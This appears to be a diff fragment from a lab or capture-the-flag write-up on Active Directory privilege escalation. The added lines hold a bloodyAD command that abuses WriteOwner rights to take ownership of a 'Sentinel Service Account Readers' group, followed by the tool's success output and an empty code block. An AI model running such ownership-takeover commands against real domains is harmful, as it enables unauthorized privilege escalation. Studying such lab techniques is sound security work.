@@ -888,3 +888,14 @@ Looks like i have WriteOwner on the `CN=Sentinel Service Account Readers,OU=Sent
 
 # Taking ownership and granting full control over `sentinel service account readers`
 
+```python
+bloodyAD --host dc01.trask.hsm -d trask.hsm -k set owner 'CN=Sentinel Service Account Readers,OU=Sentinels,DC=trask,DC=hsm' 'CN=SENTINEL-5TAINB,OU=SENTINELS,DC=TRASK,DC=HSM'
+
+[+] Old owner S-1-5-21-939749445-4094954830-180080773-512 is now replaced by CN=SENTINEL-5TAINB,OU=SENTINELS,DC=TRASK,DC=HSM on CN=Sentinel Service Account Readers,OU=Sentinels,DC=trask,DC=hsm
+```
+
+First ill take ownership
+
+```python
+
+```
